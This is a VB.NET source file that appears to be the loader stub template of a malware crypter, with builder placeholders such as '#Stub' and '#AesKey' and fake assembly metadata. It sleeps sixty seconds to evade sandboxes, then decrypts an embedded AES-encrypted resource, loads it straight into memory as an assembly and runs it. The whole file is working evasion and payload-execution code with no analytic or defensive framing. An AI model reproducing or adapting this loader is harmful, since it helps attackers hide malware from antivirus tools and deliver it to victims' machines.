Imports System
Imports System.IO
Imports System.Reflection
Imports System.Security.Cryptography
Imports System.Text
Imports System.Resources
Imports System.Runtime.InteropServices
Imports System.Windows.Forms
Imports System.Threading

<Assembly: AssemblyTitle("#AssemblyProduct")>
<Assembly: AssemblyDescription("#AssemblyDescription")>
<Assembly: AssemblyCompany("#AssemblyProduct")>
<Assembly: AssemblyProduct("#AssemblyProduct")>
<Assembly: AssemblyCopyright("#AssemblyCopyright")>
<Assembly: AssemblyTrademark("#AssemblyTrademark")>
<Assembly: AssemblyFileVersion("#AssemblyMajorVersion" & "." & "#AssemblyMinorVersion" & "." & "#AssemblyBuildPart" & "." & "#AssemblyPrivatePart")>
<Assembly: AssemblyVersion("#AssemblyMajorVersion" & "." & "#AssemblyMinorVersion" & "." & "#AssemblyBuildPart" & "." & "#AssemblyPrivatePart")>
<Assembly: Guid("#Guid")>
<Assembly: ComVisible(False)>

Namespace Loader
	Public Class Program
		<STAThread> _
		Public Shared Sub Main()
			Application.EnableVisualStyles()
			Application.SetCompatibleTextRenderingDefault(False)
			Application.Run(New Chainski())
		End Sub
	End Class

	Public Class Chainski
		Inherits Form

		Public Sub New()
			Initialize()
		End Sub

		Public Sub Initialize()
			Thread.Sleep(60 * 1000)
			Dim myAssembly As System.Reflection.Assembly = AppDomain.CurrentDomain.Load(AES_Decrypt(GetResource("#Stub")))
			Dim myType As Type = myAssembly.GetType("Stub.Program")
'INSTANT VB NOTE: In the following line, Instant VB substituted 'Object' for 'dynamic' - this will work in VB with Option Strict Off:
			Dim myObj As Object = Activator.CreateInstance(myType)
			myObj.Run()
		End Sub

		Private Shared Function AES_Decrypt(ByVal bytesToBeDecrypted() As Byte) As Byte()
			Dim decryptedBytes() As Byte = Nothing
			Dim saltBytes() As Byte = { 1, 2, 3, 4, 5, 6, 7, 8 }
			Using ms As New MemoryStream()
				Using AES As New RijndaelManaged()
					AES.KeySize = 256
					AES.BlockSize = 256
					Dim passwordBytes = Encoding.UTF8.GetBytes("#AesKey")
					Dim key = New Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000)
					AES.Key = key.GetBytes(AES.KeySize \ 8)
					AES.IV = key.GetBytes(AES.BlockSize \ 8)
					AES.Mode = CipherMode.CBC
					Using cs = New CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write)
						cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length)
						cs.Close()
					End Using
					decryptedBytes = ms.ToArray()
				End Using
			End Using
			Return decryptedBytes
		End Function

		Private Shared Function GetResource(ByVal file As String) As Byte()
			Dim ResManager As New ResourceManager("#ParentResource", System.Reflection.Assembly.GetExecutingAssembly())
			Return DirectCast(ResManager.GetObject(file), Byte())
		End Function
	End Class
End Namespace
